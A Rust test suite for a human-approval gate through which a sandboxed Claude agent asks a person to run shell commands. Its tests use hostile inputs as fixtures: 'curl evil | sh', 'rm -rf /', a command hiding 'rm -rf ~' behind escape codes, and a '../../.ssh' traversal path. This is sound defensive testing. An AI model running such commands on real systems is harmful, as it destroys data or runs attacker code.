//! Run requests: ask-to-run (inside the sandbox), claude-run-approve (outside), the daemon's queue.

mod common;
use common::sandbox::*;

use serde_json::{Value, json};
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Child, Stdio};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

const TIMEOUT: Duration = Duration::from_secs(5);

/// Where the approval terminal writes Theo's answers.
fn answers(sandbox: &Sandbox) -> PathBuf {
    sandbox.answers("runs")
}

fn now() -> i64 {
    SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as i64
}

fn files_with_extension(directory: &Path, extension: &str) -> Vec<PathBuf> {
    let Ok(entries) = fs::read_dir(directory) else { return Vec::new() };
    entries.flatten().map(|entry| entry.path()).filter(|path| path.extension().is_some_and(|found| found == extension)).collect()
}

struct AskToRun {
    sandbox: Sandbox,
    runs: PathBuf,
    daemon: Option<ReportSocket>,
}

impl AskToRun {
    fn new() -> AskToRun {
        AskToRun::answering("ok")
    }

    /// With a daemon that answers every request `reply`.
    fn answering(reply: &str) -> AskToRun {
        let sandbox = Sandbox::new();
        let runs = sandbox.root.join("runs");
        let daemon = Some(ReportSocket::start(&sandbox.runtime.join("claude-report/osd-report.sock"), reply));
        AskToRun { sandbox, runs, daemon }
    }

    fn ask(&self, arguments: &[&str], wait: &str) -> Child {
        let runs = self.runs.display().to_string();
        self.sandbox.command(bin().join("ask-to-run"), &[("CLAUDE_RUNS_DIR", &runs), ("ASK_TO_RUN_WAIT_S", wait)])
            .args(arguments).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap()
    }

    /// The request the daemon received, whole, on its report socket.
    fn request(&self) -> Value {
        let lines = self.daemon.as_ref().unwrap().received(Duration::from_secs(3));
        let line = lines.first().expect("no request filed");
        serde_json::from_str(line.strip_prefix("run-request ").unwrap_or_else(|| panic!("not a run request: {line}"))).unwrap()
    }

    fn answer(&self, request: &Value, result: Value) {
        fs::write(answers(&self.sandbox).join(format!("{}.result", request["id"].as_str().unwrap())), result.to_string()).unwrap();
    }
}

#[test]
fn a_request_is_filed_announced_and_answered_with_the_output() {
    let fixture = AskToRun::new();
    let root = fixture.sandbox.root.display().to_string();
    let asking = fixture.ask(&["--cwd", &root, "--why", "The kernel version, to pick the right headers.", "uname -r"], "5");
    let request = fixture.request();
    assert_eq!((request["command"].as_str(), request["cwd"].as_str(), request["why"].as_str()),
               (Some("uname -r"), Some(root.as_str()), Some("The kernel version, to pick the right headers.")));
    fixture.answer(&request, json!({"status": "ran", "exit": 3, "output": "\x1b=6.17.1\x1b[31m-arch\x1b[0m\r\n\x1b>"}));
    let output = finish(asking, TIMEOUT);
    assert_eq!(output.status.code(), Some(3));
    let shown = stdout(&output);
    assert!(shown.contains("6.17.1-arch"), "{shown}");
    assert!(!shown.contains('\x1b'), "{shown:?}");
    assert!(shown.contains("[exit 3]"), "{shown}");
}

#[test]
fn nothing_is_left_in_the_folder_every_sandbox_writes() {
    // Security audit H3: the request goes whole to the daemon; a file there could be rewritten.
    let fixture = AskToRun::new();
    let asking = fixture.ask(&["--why", "x", "true"], "5");
    let request = fixture.request();
    assert!(files_with_extension(&fixture.runs, "request").is_empty());
    fixture.answer(&request, json!({"status": "declined"}));
    finish(asking, TIMEOUT);
}

#[test]
fn a_request_the_daemon_refuses_says_why() {
    let fixture = AskToRun::answering("refused: its answers folder is not x");
    let output = finish(fixture.ask(&["--why", "x", "true"], "5"), TIMEOUT);
    assert_eq!(output.status.code(), Some(1));
    assert!(stdout(&output).contains("refused the request: its answers folder is not x"), "{}", stdout(&output));
}

#[test]
fn a_chain_that_failed_names_the_step_it_stopped_at() {
    let fixture = AskToRun::new();
    let asking = fixture.ask(&["--why", "Build then test.", "make cockpit; and make test"], "5");
    let request = fixture.request();
    fixture.answer(&request, json!({"status": "ran", "exit": 2, "output": "error", "failed_step": "make test"}));
    let shown = stdout(&finish(asking, TIMEOUT));
    assert!(shown.contains("[exit 2 · stopped at: make test]"), "{shown}");
}

#[test]
fn a_long_output_shows_its_end_and_where_the_rest_is() {
    let fixture = AskToRun::new();
    let asking = fixture.ask(&["--why", "Run the tests.", "make test"], "5");
    let request = fixture.request();
    let output: String = (1..=500).map(|line| format!("line {line}\n")).collect();
    fixture.answer(&request, json!({"status": "ran", "exit": 0, "output": output, "output_file": "/answers/runs/x.output"}));
    let shown = stdout(&finish(asking, TIMEOUT));
    assert!(shown.contains("[first 380 of 500 lines left out; the whole output is in /answers/runs/x.output]"), "{shown}");
    assert!(shown.contains("line 500") && !shown.contains("line 380\n"), "{shown}");
}

#[test]
fn a_declined_request_exits_125() {
    let fixture = AskToRun::new();
    let asking = fixture.ask(&["--why", "x", "rm -rf /"], "5");
    fixture.answer(&fixture.request(), json!({"status": "declined"}));
    let output = finish(asking, TIMEOUT);
    assert_eq!(output.status.code(), Some(125));
    assert!(stdout(&output).contains("declined"), "{}", stdout(&output));
}

#[test]
fn no_answer_in_time_says_how_to_keep_waiting() {
    let fixture = AskToRun::new();
    let asking = fixture.ask(&["--why", "x", "true"], "1");
    let request = fixture.request();
    let output = finish(asking, TIMEOUT);
    assert_eq!(output.status.code(), Some(124));
    let wait_hint = format!("ask-to-run --wait {}", request["id"].as_str().unwrap());
    assert!(stdout(&output).contains(&wait_hint), "{}", stdout(&output));
}

#[test]
fn while_waiting_it_keeps_a_heartbeat_for_the_daemon() {
    let fixture = AskToRun::new();
    let asking = fixture.ask(&["--why", "x", "true"], "5");
    let request = fixture.request();
    let heartbeat = fixture.runs.join(format!("{}.waiting", request["id"].as_str().unwrap()));
    assert!(heartbeat.exists(), "no heartbeat");
    fixture.answer(&request, json!({"status": "declined"}));
    finish(asking, TIMEOUT);
    assert!(!heartbeat.exists(), "heartbeat left after the answer");
}

#[test]
fn waiting_on_a_dropped_request_says_to_ask_again() {
    let fixture = AskToRun::new();
    fs::create_dir_all(&fixture.runs).unwrap();
    fs::write(answers(&fixture.sandbox).join("0123456789ab.result"), json!({"status": "abandoned"}).to_string()).unwrap();
    let output = finish(fixture.ask(&["--wait", "0123456789ab"], "5"), TIMEOUT);
    assert_eq!(output.status.code(), Some(124));
    assert!(stdout(&output).contains("dropped"), "{}", stdout(&output));
}

#[test]
fn without_a_daemon_it_says_to_fall_back() {
    let mut fixture = AskToRun::new();
    fixture.daemon = None;
    let output = finish(fixture.ask(&["--why", "x", "true"], "5"), TIMEOUT);
    assert_eq!(output.status.code(), Some(126));
    assert_eq!(files_with_extension(&fixture.runs, "waiting"), Vec::<PathBuf>::new());
}

#[test]
fn a_command_without_why_is_refused_before_anything_is_filed() {
    let fixture = AskToRun::new();
    let root = fixture.sandbox.root.display().to_string();
    let output = finish(fixture.ask(&["--cwd", &root, "uname -r"], "5"), TIMEOUT);
    assert_eq!(output.status.code(), Some(2));
    assert!(stderr(&output).contains("--why is required"), "{}", stderr(&output));
    assert!(fixture.daemon.as_ref().unwrap().received(Duration::from_millis(200)).is_empty(), "a request was filed");
}

struct Approve {
    sandbox: Sandbox,
    /// The daemon's copies of the requests (cockpit::approval::held_request).
    held: PathBuf,
    editor: PathBuf,
}

impl Approve {
    fn new() -> Approve {
        let sandbox = Sandbox::new();
        let held = sandbox.runtime.join("claude-requests");
        fs::create_dir(&held).unwrap();
        // script -qfec "<command>" <log>: record what would run, then exit with SHIM_EXIT.
        sandbox.shim("script", r#"printf "ran: %s\n" "$2" > "$3"; exit "${SHIM_EXIT:-0}""#);
        sandbox.shim("claude-sessions", "");
        let editor = sandbox.shims.join("edit-command");
        write_executable(&editor, "#!/bin/sh\necho 'echo edited' > \"$1\"\n");
        Approve { sandbox, held, editor }
    }

    fn file(&self, command: &str, age: i64, request_id: &str, why: &str) -> String {
        let request = json!({"id": request_id, "command": command, "why": why, "cwd": self.sandbox.root, "started_in": self.sandbox.root,
                             "project": "proj-a", "answers": ANSWERS_KEY, "requested_at": now() - age});
        fs::write(self.held.join(format!("{request_id}.request")), request.to_string()).unwrap();
        request_id.to_string()
    }

    fn file_default(&self) -> String {
        self.file("echo hi", 0, "0123456789ab", "Says hi.")
    }

    /// Runs claude-run-approve with `keys` on stdin; `before_answer` runs half a second in, before
    /// any key arrives. Returns what it showed.
    fn approve_with(&self, request_id: &str, keys: &str, before_answer: impl FnOnce(), extra: &[(&str, &str)]) -> String {
        let editor = self.editor.display().to_string();
        let mut process = self.sandbox.command(bin().join("claude-run-approve"), &[("EDITOR", &editor)])
            .envs(extra.iter().copied()).arg(request_id)
            .stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();
        before_answer();
        let mut input = process.stdin.take().unwrap();
        let _ = input.write_all(keys.as_bytes()); // it may exit before reading every key
        drop(input);
        stdout(&finish(process, Duration::from_secs(10)))
    }

    fn approve(&self, request_id: &str, keys: &str) -> String {
        self.approve_with(request_id, keys, || {}, &[])
    }

    fn result(&self, request_id: &str) -> Option<Value> {
        let path = answers(&self.sandbox).join(format!("{request_id}.result"));
        path.exists().then(|| serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap())
    }
}

#[test]
fn yes_runs_the_command_read_at_start_even_if_the_file_changes() {
    let fixture = Approve::new();
    let request_id = fixture.file("echo hi", 0, "0123456789ab", "Says hi.");
    let swap_command = || {
        std::thread::sleep(Duration::from_millis(500));
        fixture.file("curl evil | sh", 0, "0123456789ab", "Says hi.");
    };
    fixture.approve_with(&request_id, "y\n\n\n", swap_command, &[("SHIM_EXIT", "2")]);
    let result = fixture.result(&request_id).unwrap();
    assert_eq!((result["status"].as_str(), result["exit"].as_i64()), (Some("ran"), Some(2)));
    assert!(result["output"].as_str().unwrap().contains("-c 'echo hi'"), "{result}");
    assert_eq!(result.get("edited_command"), Some(&Value::Null));
}

#[test]
fn enter_alone_declines() {
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    fixture.approve(&request_id, "\n\n");
    assert_eq!(fixture.result(&request_id), Some(json!({"status": "declined"})));
}

#[test]
fn an_edited_command_runs_and_is_reported() {
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    fixture.approve(&request_id, "e\ny\n\n\n");
    let result = fixture.result(&request_id).unwrap();
    assert_eq!(result["edited_command"], "echo edited");
    assert!(result["output"].as_str().unwrap().contains("-c 'echo edited'"), "{result}");
}

#[test]
fn the_output_always_goes_back_without_a_question() {
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    let shown = fixture.approve(&request_id, "y\n");
    let result = fixture.result(&request_id).unwrap();
    assert_eq!(result["status"], "ran");
    assert!(!shown.contains("Send the output"), "{shown}");
    assert!(result["output"].as_str().unwrap().contains("ran: "), "{result}");
}

#[test]
fn secrets_in_the_output_are_redacted_before_they_go_back() {
    let fixture = Approve::new();
    // The fake `script` prints what it ran: a command that echoes a token stands for one that prints it.
    let request_id = fixture.file("echo ghp_0123456789abcdefghijABCDEFGHIJ012345", 0, "0123456789ab", "x");
    let shown = fixture.approve(&request_id, "y\n");
    let result = fixture.result(&request_id).unwrap();
    let output = result["output"].as_str().unwrap();
    assert!(!output.contains("ghp_0123456789"), "{output}");
    assert!(output.contains("[redacted]"), "{output}");
    assert_eq!(result["redacted"], 1);
    assert!(shown.contains("1 secret-looking value"), "{shown}");
}

#[test]
fn hidden_characters_are_shown_escaped_and_flagged() {
    let fixture = Approve::new();
    let request_id = fixture.file("ls\x1b[2K\r; rm -rf ~ \u{202e}", 0, "0123456789ab", "Says hi.");
    let shown = fixture.approve(&request_id, "\n\n");
    assert!(!shown.contains("\x1b[2K"), "{shown:?}");
    assert!(shown.contains("\\u001b"), "{shown}");
    assert!(shown.contains("\\u202e"), "{shown}");
    assert!(shown.contains("hidden characters"), "{shown}");
    assert_eq!(fixture.result(&request_id), Some(json!({"status": "declined"})));
}

#[test]
fn claudes_explanation_shows_under_the_command_escaped() {
    let fixture = Approve::new();
    let request_id = fixture.file("echo hi", 0, "0123456789ab", "Restarts the OSD daemon\x1b[2K so it loads the guide code.");
    let shown = fixture.approve(&request_id, "\n\n");
    assert!(shown.contains("Why, in Claude's words"), "{shown}");
    assert!(shown.contains("Restarts the OSD daemon\\u001b[2K so it loads the guide code."), "{shown}");
}

#[test]
fn a_request_without_explanation_says_to_ask_claude() {
    let fixture = Approve::new();
    let shown = fixture.approve(&fixture.file("echo hi", 0, "0123456789ab", ""), "\n\n");
    assert!(shown.contains("No explanation given"), "{shown}");
}

#[test]
fn the_project_shown_is_the_one_the_daemon_found() {
    let fixture = Approve::new();
    let shown = fixture.approve(&fixture.file_default(), "\n\n");
    assert!(shown.contains("Claude · proj-a"), "{shown}");
}

#[test]
fn a_command_outside_the_sessions_folder_is_flagged() {
    // Security audit H3: a request for another project's folder must not look like the session's own.
    let fixture = Approve::new();
    for (cwd, is_flagged) in [(fixture.sandbox.root.join("apps"), false), (std::env::temp_dir(), true)] {
        fs::create_dir_all(&cwd).unwrap();
        let request = json!({"id": "0123456789ab", "command": "make", "why": "x", "cwd": cwd, "started_in": fixture.sandbox.root,
                             "project": "proj-a", "answers": ANSWERS_KEY, "requested_at": now()});
        fs::write(fixture.held.join("0123456789ab.request"), request.to_string()).unwrap();
        let _ = fs::remove_file(answers(&fixture.sandbox).join("0123456789ab.result"));
        let shown = fixture.approve("0123456789ab", "\n");
        assert_eq!(shown.contains("outside the folder the session works in"), is_flagged, "{}: {shown}", cwd.display());
    }
}

#[test]
fn it_tells_the_daemon_when_it_needs_theo() {
    let fixture = Approve::new();
    // On the host FIFO: phases never come from a sandbox.
    let mut listener = Listener::start(&fixture.sandbox.runtime.join("osd-host.fifo"));
    let request_id = fixture.file_default();
    fixture.approve(&request_id, "y\n\n");
    std::thread::sleep(Duration::from_millis(200));
    let received = listener.received();
    let phases: Vec<&str> = received.lines().filter(|line| line.starts_with("run-phase"))
        .map(|line| line.split_whitespace().last().unwrap()).collect();
    assert_eq!(phases, ["asking", "running", "done"]);
}

#[test]
fn stale_and_answered_requests_are_refused() {
    let fixture = Approve::new();
    let stale = fixture.file("echo hi", 3600, "0123456789ab", "Says hi.");
    let shown = fixture.approve(&stale, "y\n\n");
    assert!(shown.contains("older than 15 minutes"), "{shown}");
    assert_eq!(fixture.result(&stale), None);
    let answered = fixture.file("echo hi", 0, "ba9876543210", "Says hi.");
    fs::write(answers(&fixture.sandbox).join(format!("{answered}.result")), r#"{"status": "declined"}"#).unwrap();
    let shown = fixture.approve(&answered, "y\n\n");
    assert!(shown.contains("already answered"), "{shown}");
}

#[test]
fn a_link_planted_at_the_old_temporary_name_writes_nothing_through_it() {
    // The runs folder is the sandbox's to write: a symlink where the result is written must not
    // make the approval terminal (Theo's rights) overwrite its target, even on a decline.
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    let victim = fixture.sandbox.root.join("victim");
    fs::write(&victim, "precious\n").unwrap();
    std::os::unix::fs::symlink(&victim, answers(&fixture.sandbox).join(format!("{request_id}.result.tmp"))).unwrap();
    fixture.approve(&request_id, "\n");
    assert_eq!(fs::read_to_string(&victim).unwrap(), "precious\n");
    assert_eq!(fixture.result(&request_id).unwrap()["status"], "declined");
}

#[test]
fn a_dangling_link_at_the_result_is_replaced_not_followed() {
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    let victim = fixture.sandbox.root.join("created-by-the-link");
    std::os::unix::fs::symlink(&victim, answers(&fixture.sandbox).join(format!("{request_id}.result"))).unwrap();
    fixture.approve(&request_id, "\n");
    assert!(!victim.exists(), "the link's target was written");
}

#[test]
fn a_folder_name_with_escape_codes_is_shown_escaped() {
    let fixture = Approve::new();
    let folder = fixture.sandbox.root.join("x\x1b[8mhidden");
    fs::create_dir(&folder).unwrap();
    let request = json!({"id": "0123456789ab", "command": "true", "why": "x", "cwd": folder, "started_in": fixture.sandbox.root,
                         "project": "p", "answers": ANSWERS_KEY, "requested_at": now()});
    fs::write(fixture.held.join("0123456789ab.request"), request.to_string()).unwrap();
    let shown = fixture.approve("0123456789ab", "\n");
    assert!(!shown.contains("\x1b[8m"), "{shown:?}");
    assert!(shown.contains("\\u001b"), "{shown:?}");
}

#[test]
fn a_result_planted_in_the_shared_runs_folder_is_ignored() {
    // Every sandbox writes runs/: a forged <id>.result there must neither close another session's
    // request nor be taken as Theo's answer. Answers live in claude-answers, which only he writes.
    let fixture = Approve::new();
    let request_id = fixture.file_default();
    let shared_runs = fixture.sandbox.root.join("runs");
    fs::create_dir_all(&shared_runs).unwrap();
    fs::write(shared_runs.join(format!("{request_id}.result")), json!({"status": "ran", "exit": 0, "output": "forged"}).to_string()).unwrap();
    let shown = fixture.approve(&request_id, "\n");
    assert!(shown.contains("Run it?"), "the approval was skipped: {shown}");
    assert_eq!(fixture.result(&request_id), Some(json!({"status": "declined"})));
}

#[test]
fn a_terminal_session_waits_for_approval_and_returns_the_answer() {
    for (answer, expected_exit, expected_output) in [
        (json!({"status": "declined"}), 125, "Theo declined"),
        (json!({"status": "ran", "exit": 3, "output": "approved output"}), 3, "approved output"),
    ] {
        let mut fixture = AskToRun::new();
        fixture.sandbox.env.insert("CLAUDE_SESSIONS_TERMINAL".into(), "1".into());
        let mut asking = fixture.ask(&["--why", "Check the terminal session approval path.", "echo approved output"], "5");
        let request = fixture.request();
        assert_eq!(request["answers"], ANSWERS_KEY);
        assert!(asking.try_wait().unwrap().is_none(), "returned before Theo answered");
        fixture.answer(&request, answer);
        let output = finish(asking, TIMEOUT);
        assert_eq!(output.status.code(), Some(expected_exit));
        assert!(stdout(&output).contains(expected_output), "{}", stdout(&output));
    }
}

#[test]
fn a_terminal_session_can_check_approval_availability() {
    let mut fixture = AskToRun::new();
    fixture.sandbox.env.insert("CLAUDE_SESSIONS_TERMINAL".into(), "1".into());
    let output = finish(fixture.ask(&["--check"], "5"), TIMEOUT);
    assert_eq!(output.status.code(), Some(0), "{}", stdout(&output));
}

#[test]
fn a_terminal_session_without_its_projects_answers_folder_still_falls_back() {
    let mut fixture = AskToRun::new();
    fixture.sandbox.env.insert("CLAUDE_SESSIONS_TERMINAL".into(), "1".into());
    fixture.sandbox.env.insert("CLAUDE_ANSWERS_KEY".into(), String::new());
    let output = finish(fixture.ask(&["--why", "x", "true"], "5"), TIMEOUT);
    assert_eq!(output.status.code(), Some(126));
    assert!(stdout(&output).contains("no CLAUDE_ANSWERS_KEY"), "{}", stdout(&output));
    assert!(fixture.daemon.as_ref().unwrap().received(Duration::from_millis(200)).is_empty(), "a request was filed");
}

#[test]
fn a_session_the_launcher_gave_no_answers_folder_falls_back() {
    // Security audit M3: answers go to the asking project's own folder, or nowhere.
    let fixture = AskToRun::new();
    let runs = fixture.runs.display().to_string();
    let output = finish(fixture.sandbox.command(bin().join("ask-to-run"), &[("CLAUDE_RUNS_DIR", &runs), ("CLAUDE_ANSWERS_KEY", "")])
        .args(["--why", "x", "true"]).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap(), TIMEOUT);
    assert_eq!(output.status.code(), Some(126));
    assert!(stdout(&output).contains("restart it"), "{}", stdout(&output));
    assert!(fixture.daemon.as_ref().unwrap().received(Duration::from_millis(200)).is_empty(), "a request was filed");
}

#[test]
fn a_request_names_its_projects_answers_folder() {
    let fixture = AskToRun::new();
    let mut asking = fixture.ask(&["--why", "Says hi.", "echo hi"], "1");
    let request = fixture.request();
    let _ = asking.kill();
    assert_eq!(request["answers"].as_str(), Some(ANSWERS_KEY));
}

#[test]
fn a_request_naming_no_answers_folder_or_a_path_is_refused() {
    let fixture = Approve::new();
    for answers in [Value::Null, json!("../../.ssh"), json!("")] {
        let request_id = "0123456789ab";
        let request = json!({"id": request_id, "command": "echo hi", "why": "Says hi.", "cwd": fixture.sandbox.root, "answers": answers,
                             "requested_at": now()});
        fs::write(fixture.held.join(format!("{request_id}.request")), request.to_string()).unwrap();
        let shown = fixture.approve(request_id, "y\n");
        assert!(shown.contains("names no answers folder"), "{answers}: {shown}");
    }
}

/// What `ask-to-run --check` says, and its exit code.
fn check(sandbox: &Sandbox) -> (Option<i32>, String) {
    let output = sandbox.run(bin().join("ask-to-run"), &["--check"], &[]);
    (output.status.code(), stdout(&output))
}

#[test]
fn check_says_ask_to_run_works_when_the_daemon_answers() {
    let fixture = AskToRun::new();
    let (code, shown) = check(&fixture.sandbox);
    assert_eq!(code, Some(0), "{shown}");
}

#[test]
fn check_names_a_missing_socket_and_says_to_restart_the_session() {
    // The sandbox of a session started before the socket moved has none: a restart mounts it.
    let mut fixture = AskToRun::new();
    fixture.daemon = None;
    let (code, shown) = check(&fixture.sandbox);
    assert_eq!(code, Some(126));
    assert!(shown.contains("has no report socket") && shown.contains("restart this session"), "{shown}");
}

#[test]
fn check_names_a_socket_nobody_listens_on_and_the_command_that_brings_it_back() {
    let mut fixture = AskToRun::new();
    fixture.daemon = None;
    let socket = fixture.sandbox.runtime.join("claude-report/osd-report.sock");
    fs::create_dir_all(socket.parent().unwrap()).unwrap();
    drop(std::os::unix::net::UnixListener::bind(&socket).unwrap()); // the file stays, nobody listens
    let (code, shown) = check(&fixture.sandbox);
    assert_eq!(code, Some(126));
    assert!(shown.contains("nothing listens") && shown.contains("systemctl --user restart osd-report.socket osd.service"), "{shown}");
}

#[test]
fn a_daemon_that_never_answers_points_at_an_old_build() {
    let fixture = AskToRun::answering("");
    let output = finish(fixture.ask(&["--why", "x", "true"], "5"), TIMEOUT);
    assert_eq!(output.status.code(), Some(126));
    assert!(stdout(&output).contains("claude-sessions reload"), "{}", stdout(&output));
}
